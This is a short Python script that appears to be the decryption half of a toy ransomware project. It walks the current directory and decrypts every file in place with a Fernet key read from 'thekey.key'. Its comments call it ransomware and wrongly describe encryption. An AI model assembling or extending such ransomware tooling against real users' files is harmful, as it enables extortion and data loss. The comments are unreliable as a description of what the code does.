#! /bin/python3 

# This is ransomeware 

import os 
from cryptography.fernet import Fernet 

# Find files 

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# using key for decryption

with open("thekey.key", "rb") as key:
	secretkey =  key.read()


# opening the files 

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	# locking the files 
	contents_decrypted = Fernet(secretkey).decrypt(contents)
	# write back file as encrypted
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)
	
